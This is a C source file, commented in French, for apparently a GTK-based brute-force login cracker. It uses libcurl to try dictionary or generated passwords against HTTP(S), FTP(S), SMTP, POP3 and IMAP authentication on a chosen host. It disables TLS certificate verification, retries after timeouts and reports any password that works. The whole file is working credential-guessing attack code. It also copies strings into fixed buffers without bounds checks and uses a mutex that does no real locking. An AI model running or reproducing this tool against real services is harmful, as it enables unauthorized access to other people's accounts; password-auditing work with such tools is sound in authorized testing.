#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <curl/curl.h>
#include <string.h>
#include "../interface/interface.h"
#include "../struct/gtkstruct.h"
#include "requests.h"

void * sendRequestCurl(void * attackstack){

  // mutex pour le multithreading.
  pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
  pthread_cond_t cond_stock = PTHREAD_COND_INITIALIZER;

  pthread_mutex_lock(&mutex);
  pthread_setcancelstate(PTHREAD_CANCEL_DISABLE,NULL);
  struct AttackStack * attackStackPtr = (struct AttackStack*) attackstack;
  char password[255];
  double timeout = DEFAULT_DELAY;
  double increment = DELAY_INCREMENT;
  int tries = 0;
  long httpCode = 404;

    if (attackStackPtr->dic == 1){
      fgets(password,100,attackStackPtr->file);
      if (password[strlen(password)-1] == '\n'){
        password[strlen(password)-1] = 0;
      }
    } else {
      if  (attackStackPtr->bruteIter >= attackStackPtr->bruteCount){
        attackStackPtr->handler->stopped = 1;
        pthread_mutex_unlock(&mutex);
        pthread_setcancelstate(PTHREAD_CANCEL_ENABLE,NULL);
        pthread_exit(NULL);
      } else {
        strcpy(password,getNextPassword(attackStackPtr));
      }
    }

  pthread_mutex_unlock(&mutex);

  CURL * curl;
  CURLcode res;
  char userpwd [255];
  char url [255];
  const gchar * protocol = gtk_combo_box_text_get_active_text(
    GTK_COMBO_BOX_TEXT(attackStackPtr->handler->protoList));
  // on récupère les identifiants sous cette forme --> username:password
  strcpy(userpwd,attackStackPtr->username);
  strcat(userpwd,":");
  strcat(userpwd,password);
  // initialisation du handler de requête.
  curl = curl_easy_init();

  if (strcmp(protocol,"FTPS (Implicit SSL/TLS)") == 0
  ||  strcmp(protocol,"FTP (Explicit SSL/TLS)") == 0
  ||  strcmp(protocol,"SMTPS (SSL/TLS)") == 0
  ||  strcmp(protocol,"SMTP (STARTTLS)") == 0
  ||  strcmp(protocol,"HTTPS") == 0
  ||  strcmp(protocol,"POP3S (SSL/TLS)") == 0
  ||  strcmp(protocol,"POP3 (STARTTLS)") == 0
  ||  strcmp(protocol,"IMAPS (SSL/TLS)") == 0
  ||  strcmp(protocol,"IMAP (STARTTLS)") == 0){
    // si on doit négocier SSL/TLS, on passe en mode CURLUSESSL et on désactive
    // les vérifications de certificat pour forcer la connexion si le certificat n'est
    // pas validé par une autorité qualifiée.
    curl_easy_setopt(curl,CURLOPT_USE_SSL,CURLUSESSL_TRY);
    curl_easy_setopt(curl,CURLOPT_SSL_VERIFYPEER,0);
    curl_easy_setopt(curl,CURLOPT_SSL_VERIFYHOST,0);
  }
  // formatage de l'URL pour curl.
  if (strcmp(protocol, "HTTP") == 0){
    strcpy(url,"http://");
  } else if (strcmp(protocol, "HTTPS") == 0){
    strcpy(url,"https://");
  } else if (strcmp(protocol,"FTP") == 0){
    strcpy(url,"ftp://");
  } else if (strcmp(protocol,"FTP (Explicit SSL/TLS)") == 0){
    strcpy(url,"ftp://");
  } else if (strcmp(protocol,"FTPS (Implicit SSL/TLS)") == 0){
    strcpy(url,"ftps://");
  } else if (strcmp(protocol,"SMTP") == 0){
    strcpy(url,"smtp://");
  } else if (strcmp(protocol,"SMTPS (SSL/TLS)") == 0){
    strcpy(url,"smtps://");
  } else if (strcmp(protocol,"SMTP (STARTTLS)") == 0){
    strcpy(url,"smtp://");
  } else if (strcmp(protocol,"POP3") == 0){
    strcpy(url,"pop3://");
  } else if (strcmp(protocol,"POP3S (SSL/TLS)") == 0){
    strcpy(url,"pop3s://");
  } else if (strcmp(protocol,"POP3 (STARTTLS)") == 0){
    strcpy(url,"pop3://");
  } else if (strcmp(protocol,"IMAP") == 0){
    strcpy(url,"imap://");
  } else if (strcmp(protocol,"IMAP (STARTTLS)") == 0){
    strcpy(url,"imap://");
  } else if (strcmp(protocol,"IMAPS (SSL/TLS)") == 0){
    strcpy(url,"imaps://");
  }
  // concaténation de la destination (IP ou domaine).
  strcat(url,attackStackPtr->destination);

  // configuration de la requête.
  curl_easy_setopt(curl,CURLOPT_URL,url);
  curl_easy_setopt(curl,CURLOPT_PORT,attackStackPtr->port);
  curl_easy_setopt(curl,CURLOPT_USERPWD,userpwd);
  curl_easy_setopt(curl,CURLOPT_WRITEFUNCTION,write_data);
  curl_easy_setopt(curl,CURLOPT_TIMEOUT,5);
  // pour http, on veut récupérer le code de retour.
  if (strcmp(protocol, "HTTP") == 0 || strcmp(protocol,"HTTPS") == 0){
    curl_easy_setopt(curl,CURLOPT_HTTPAUTH,(long)CURLAUTH_ANY);
  }

  // lancement de la requête.
  res = curl_easy_perform(curl);
  if (strcmp(protocol, "HTTP") == 0 || strcmp(protocol,"HTTPS") == 0){
    curl_easy_getinfo(curl,CURLINFO_RESPONSE_CODE,&httpCode);
  }
  /* gestion des erreurs timeout. on essaie 5 fois en augmentant à chaque itération
     le temps d'attente du processus (au départ, 0,2 ms puis on ajoute un incrément de 0.1 ms
     qui sera doublé lui même ensuite doublé à chaque itération). */
  while (res != CURLE_OK
    && res != CURLE_LOGIN_DENIED
    && tries <= MAX_TRIES
    && attackStackPtr->handler->stopped == 0){
      if (tries == 0){
        g_idle_add_full(105,timeOutIncrease,(gpointer)attackStackPtr,NULL);
      }
      usleep(timeout);
      tries++;
      timeout+=increment;
      increment *= 2;
      res = curl_easy_perform(curl);
      if (strcmp(protocol, "HTTP") == 0 || strcmp(protocol,"HTTPS") == 0){
        curl_easy_getinfo(curl,CURLINFO_RESPONSE_CODE,&httpCode);
      }
  }
  /* message d'erreur en cas d'échec après 5 essais. On peut considérer à ce stade
     que la serveur est en état de déni de service, ou que l'utilisateur a mal configuré
     les champs de la partie "target". On affiche alors un warning avec l'erreur que curl
     nous renvoie à partir du résultat du dernier essai.*/
  if ( res != CURLE_LOGIN_DENIED
    && res != CURLE_OK
    && attackStackPtr->handler->stopped == 0){
      strcpy(attackStackPtr->errorMessage ,curl_easy_strerror(res) );
      g_idle_add_full(105,timeOutError,(gpointer)attackStackPtr,NULL);
  }
   /* si la requête est acceptée par le serveur et ne fait pas objet d'une erreur d'auth, on
      lance la fonction authSuccess pour stopper l'attaque et afficher le message de succès.
      pour le mode HTTP on a besoin de connaître le code de retour HTTP pour savoir si oui ou non
      l'authentification a réussie (en effet, le code de retour 0 de curl signifie seulement que la
      requête a aboutie, cela aurait pu signifier que l'authentification a réussie, comme pour les autres
      protocoles implémentés dans le programme, mais dans le cas de l'HTTP, la réponse concrète du serveur
      se trouve dans le code de retour HTTP (200 pour succès), et non le code retour de la requête curl
      (0 pour succès, valeur de CURLE_OK).*/

    // pour HTTP/HTTPS
  if (strcmp(protocol, "HTTP") == 0 || strcmp(protocol,"HTTPS") == 0){
    if (res == CURLE_OK && httpCode == 200){
      authSuccess(password,attackStackPtr);
    }
  }
    // pour les reste des protocoles.
  else {
    if (res == CURLE_OK){
      authSuccess(password,attackStackPtr);
    }
  }
  // nettoyage de la requête.
  curl_easy_cleanup(curl);

  pthread_setcancelstate(PTHREAD_CANCEL_ENABLE,NULL);
  pthread_exit(NULL);
}
